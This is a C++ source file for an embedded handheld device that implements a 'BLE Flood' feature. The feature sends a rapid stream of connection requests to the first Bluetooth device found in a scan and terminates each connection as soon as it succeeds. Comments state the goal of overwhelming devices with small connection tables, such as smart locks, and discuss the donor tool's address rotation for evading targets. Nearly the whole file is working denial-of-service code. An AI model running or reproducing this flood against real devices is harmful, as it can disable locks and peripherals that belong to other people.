#include "ble_flood.h"
#include "ble_central.h"
#include "ble_common.h"
#include "ble_scan.h" // BleScanFeature::first_device_addr()/first_device_addr_type() --
                       // same directory as this file (features/ble/), so a plain
                       // relative include, matching ble_central.h's own include
                       // above rather than main.cpp's "features/ble/..." form
                       // (main.cpp includes from src/, this file is already inside
                       // features/ble/).
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <Arduino.h> // Serial, millis(), delay() -- same as every other BLE feature file
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <cstring>

extern FeatureRegistry g_registry;

// -----------------------------------------------------------------------------
// BLE flood (second Phase 2 plan, Task 14): rapid connection-request flood
// against a target -- connect, immediately terminate on success, repeat.
// Meant to overwhelm devices that can only hold a small number of BLE
// connections (smart locks, peripherals).
//
// Donor: ~/src/poseidon-tab5/src/features/ble_flood.cpp. Two fixes ported in
// from the real donor rather than the plan brief's transcription:
//
//   Bug 1 (peer address type): the brief hardcoded s_target.type =
//   BLE_ADDR_PUBLIC. Most modern BLE peripherals advertise random addresses,
//   so a hardcoded PUBLIC type silently fails to connect against them -- the
//   same bug class already found and fixed in this plan's
//   ble_central_spike.cpp, ble_clone.cpp, and ble_gatt_explorer.cpp. Fixed by
//   using BleScanFeature::first_device_addr_type() (see ble_scan.h), the
//   accessor Task 1's implementer added for exactly this situation.
//
//   Bug 2 (connection leak on teardown, POS-AUDIT-220 / ble-004): the donor's
//   feat_ble_flood() teardown does NOT just call ble_gap_conn_cancel() once.
//   Its own comment documents why: a single cancel races
//   BLE_GAP_EVENT_CONNECT -- if the controller delivers a successful
//   connection between the cancel and function exit, the connection leaks
//   (peripheral stays joined, exhausts a connection-table slot, and the next
//   BLE feature in the same session trips conn-table-full). The donor loops
//   the cancel for up to 500ms, using its last ble_gap_connect() return code
//   as the "is the controller still possibly mid-attempt" signal. Ported into
//   this file's LV_EVENT_DELETE handler below (see s_last_connect_rc).
//
// Own-address rotation (design tension, not a required fix): the donor also
// randomizes the Tab5's OWN address before every connect attempt
// (set_random_mac() + ble_hs_id_set_rnd() + BLE_OWN_ADDR_RANDOM passed to
// ble_gap_connect()). This file instead uses the shared BleCentral::connect()
// helper, which hardcodes BLE_OWN_ADDR_PUBLIC for every call (see
// ble_central.h) -- so this flood repeatedly attempts from the same fixed
// own address rather than rotating identities per attempt. Still
// functionally a flood (repeated connect-then-drop cycles overwhelm a
// small connection table), but it loses the donor's per-attempt address
// rotation, which may matter against a target that treats "same peer
// reconnecting" differently from "many distinct peers connecting". Left
// as-is deliberately: BleCentral::connect() is this plan's established
// shared helper (already used by ble_central_spike.cpp and
// ble_gatt_explorer.cpp), and extending its signature to support an
// own-address override is a bigger call than this task alone should make
// unilaterally. Disclosed here as a known, real fidelity gap versus the
// donor's actual design.
// -----------------------------------------------------------------------------

namespace BleFloodFeature {

static ble_addr_t s_target;
static bool s_have_target = false;
static bool s_active = false;
static uint32_t s_attempt_count = 0;
static lv_obj_t *s_status_label = nullptr;

// Mirrors the donor's s_flood_last_rc: the return code of the most recent
// ble_gap_connect() call (via BleCentral::connect() in flood_tick()). 0 means
// that call successfully started a connection attempt that may still be in
// flight; nonzero means no attempt was in flight. Used by the LV_EVENT_DELETE
// teardown loop below (Bug 2 fix) as the "is the controller still possibly
// mid-attempt" signal -- this file's poll() loop never called
// BleCentral::connect()'s return value for anything before, so it was
// previously discarded entirely.
static volatile int s_last_connect_rc = 0;

static int gap_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        s_attempt_count++;
        if (event->connect.status == 0) {
            // Immediately terminate -- the flood IS the rapid
            // connect-then-drop cycle, matching Poseidon's own
            // flood_cb behavior exactly.
            BleCentral::disconnect(event->connect.conn_handle);
        }
    }
    return 0;
}

static void flood_tick() {
    ble_gap_conn_cancel(); // cancel any attempt still in flight before starting the next
    s_last_connect_rc = BleCentral::connect(s_target, 200, gap_event_cb, nullptr);
}

static lv_obj_t *build_screen(const uint8_t addr_val[6], uint8_t addr_type) {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Flood", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Flooding...");

    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        s_active = false;
        s_status_label = nullptr;

        // POS-AUDIT-220 / ble-004 (ported from the donor's feat_ble_flood()
        // teardown, see ~/src/poseidon-tab5/src/features/ble_flood.cpp): a
        // single ble_gap_conn_cancel() races BLE_GAP_EVENT_CONNECT -- if the
        // controller delivers a successful connection between our cancel and
        // this handler returning, we leak the connection (the peripheral
        // stays joined, exhausts a connection-table slot, and the next BLE
        // feature in this session trips conn-table-full). Loop the cancel
        // for up to 500ms: each iteration cancels any attempt still in
        // flight AND races/closes any connection that landed in the last
        // 50ms gap. s_last_connect_rc == 0 means the last ble_gap_connect()
        // call (via flood_tick()) started an attempt that may still be in
        // flight, so keep canceling until it can't land or the deadline
        // passes; nonzero means nothing was in flight, so the do-while's
        // first (and only) iteration is sufficient.
        uint32_t deadline = millis() + 500;
        do {
            ble_gap_conn_cancel();
            delay(50);
        } while (s_last_connect_rc == 0 && millis() < deadline);
    }, LV_EVENT_DELETE, nullptr);

    s_target.type = addr_type; // Bug 1 fix: real peer address type, not a
                                // hardcoded BLE_ADDR_PUBLIC assumption
    memcpy(s_target.val, addr_val, 6);
    s_have_target = true;
    s_active = true;
    s_attempt_count = 0;
    s_last_connect_rc = 0;
    return screen;
}

void register_module() {
    // No launcher tile of its own -- this feature needs a target address,
    // supplied via the same "run against the first BLE-scanned device"
    // pattern Task 1's spike uses. A future target-picker UI (reusing the
    // scan-then-tap-to-select pattern Task 9/13 both already establish) is
    // a reasonable near-term follow-up; kept out of this task's own scope
    // to match the plan's Interfaces note that this task consumes
    // BleCentral only, not a new target-selection mechanism.
    g_registry.register_module({"ble_flood", "BLE Flood (first scanned)", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    const uint8_t *addr = BleScanFeature::first_device_addr(); // from Task 1, Step 4
    if (!addr) {
        Serial.println("quarky-tab5: [ble-flood] no scanned device available -- run BLE Scan first");
        return;
    }
    uint8_t addr_type = BleScanFeature::first_device_addr_type(); // Bug 1 fix
    ScreenStack::push(build_screen(addr, addr_type));
}

void poll() {
    if (!s_active) return;
    static uint32_t last_tick = 0;
    if (millis() - last_tick < 250) return;
    flood_tick();
    last_tick = millis();
    if (s_status_label) {
        char buf[32];
        snprintf(buf, sizeof(buf), "Flooding... %lu attempts", (unsigned long)s_attempt_count);
        lv_label_set_text(s_status_label, buf);
    }
}

} // namespace BleFloodFeature
